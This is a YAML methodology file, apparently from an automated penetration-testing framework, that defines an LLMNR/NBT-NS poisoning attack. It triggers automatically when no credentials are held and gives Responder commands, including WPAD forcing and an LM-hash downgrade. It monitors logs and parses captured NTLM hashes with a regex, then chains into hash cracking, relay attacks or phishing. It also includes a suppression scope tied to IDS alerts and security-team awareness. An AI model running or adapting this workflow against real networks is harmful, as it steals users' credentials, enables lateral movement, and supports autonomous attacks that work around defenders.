id: llmnr_poisoning
name: "LLMNR/NBT-NS Poisoning Attack"
category: exploitation
description: "Perform LLMNR and NBT-NS poisoning to capture authentication hashes"
estimated_duration: "45m"
risk_level: high
stealth_level: active

# Triggered when broadcast protocols are discovered and no valid creds exist
triggers:
  - type: custom_condition
    conditions:
      logic: "and"
      groups:
        - field: "broadcast_protocols"
          operator: "contains"
          value: "LLMNR"
        - field: "valid_credentials.length"
          operator: "equals"
          value: 0
    priority: 9
    description: "Trigger when LLMNR detected and no credentials available"

  - type: custom_condition
    conditions:
      logic: "and"
      groups:
        - field: "broadcast_protocols"
          operator: "contains"
          value: "NBT-NS"
        - field: "valid_credentials.length"
          operator: "equals"
          value: 0
    priority: 9
    description: "Trigger when NBT-NS detected and no credentials available"

steps:
  - id: start_responder
    name: "Start Responder"
    type: command
    description: "Start Responder to poison LLMNR/NBT-NS requests"
    order: 1
    command: "responder -I {interface} -w -F"
    command_variants:
      - condition: "stealth_required == true"
        command: "responder -I {interface} -A"
        description: "Analyze mode only (passive)"
      - condition: "target_specific == true"
        command: "responder -I {interface} -w -F --lm"
        description: "Downgrade to LM hashes if possible"
    timeout: "45m"
    expected_outputs:
      - type: text
        parser: responder
        success_indicators: ["Listening for events", "Poisoners started"]
        failure_indicators: ["Error", "Permission denied"]
    parameters:
      run_duration: "45m"
      capture_hashes: true
      force_wpad: true

  - id: monitor_captures
    name: "Monitor Hash Captures"
    type: monitoring
    description: "Monitor Responder logs for captured hashes"
    order: 2
    command: "tail -f /usr/share/responder/logs/Responder-Session.log | grep -E 'NTLMv2|NTLMv1'"
    timeout: "45m"
    expected_outputs:
      - type: text
        parser: responder
        success_indicators: ["NTLMv2-SSP Hash", "NTLMv1 Hash"]
    asset_discovery:
      search_patterns:
        - pattern: "([^:]+)::(\\w+):([a-fA-F0-9]+):([a-fA-F0-9]+):([a-fA-F0-9]+)"
          asset_type: "credential"
          confidence: 1.0
          metadata:
            credential_type: "ntlm_hash"
            needs_cracking: true

# Critical outcomes from poisoning
outcome_schema:
  captured_hashes:
    type: array
    items:
      type: object
      properties:
        user: string
        domain: string
        hash: string
        hash_type: string
    triggers: "hash_cracking"
    critical: true
  poisoning_success:
    type: boolean
    description: "Whether poisoning was successful"
  time_to_capture:
    type: string
    description: "Time until first hash captured"
  unique_users:
    type: integer
    description: "Number of unique users captured"

# Chain to hash cracking when successful
next_methodologies:
  - methodology: "hash_cracking"
    condition: "captured_hashes.length > 0"
    description: "Crack captured hashes"
    priority: 10
    context_mapping:
      hashes: "{captured_hashes}"
      hash_format: "responder"

  - methodology: "relay_attacks"
    condition: "poisoning_success == true AND captured_hashes.length == 0"
    description: "Try relay attacks if no hashes captured"
    context_mapping:
      interface: "{interface}"

  - methodology: "targeted_phishing"
    condition: "time_to_capture == null AND poisoning_success == false"
    description: "Consider phishing if poisoning fails"

# Important decision points
decision_points:
  - condition: "captured_hashes.length > 5"
    action: "stop_poisoning"
    reason: "Sufficient hashes captured"

  - condition: "time_to_capture > '2h'"
    action: "try_alternative"
    reason: "Taking too long, try different approach"

suppression:
  available_scopes:
    - scope: "network"
      description: "Network has poisoning detection"
      conditions: ["IDS alerts triggered", "Security team aware"]

deduplication:
  strategy: "signature_based"
  signature_fields: ["interface", "network_segment"]
  cooldown_period: "2h"
  max_executions: 2